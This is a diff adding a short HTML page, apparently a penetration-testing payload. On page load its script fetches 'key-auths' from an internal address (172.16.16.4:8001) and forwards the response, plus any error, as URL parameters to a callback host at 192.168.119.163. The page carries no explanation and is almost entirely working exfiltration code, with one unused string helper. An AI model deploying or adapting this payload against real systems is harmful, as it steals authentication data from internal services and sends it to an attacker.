@@ -1,0 +1,31 @@
+<html>
+<head>
+<script>
+function runscript() {
+    exfiltrate();
+    //fetch("http://192.168.119.163/itworked");
+}
+function exfiltrate() {
+    fetch("http://172.16.16.4:8001/key-auths", {
+        //credentials: 'include',
+    })
+    .then((response) => response.text())
+    .then((data) => {
+        fetch("http://192.168.119.163/callback?" + encodeURIComponent(data), {
+          credentials: 'include'           
+        });
+    }).catch(err => {
+        fetch("http://192.168.119.163/error?" + encodeURIComponent(err));
+    }); 
+}
+function truncate( str, n, useWordBoundary ){
+  if (str.length <= n) { return str; }
+  const subString = str.slice(0, n-1); // the original check
+  return (useWordBoundary ? subString.slice(0, subString.lastIndexOf(" ")) : subString);
+};
+</script>
+</head>
+<body onload='runscript()'>
+<div></div>
+</body>
+</html>
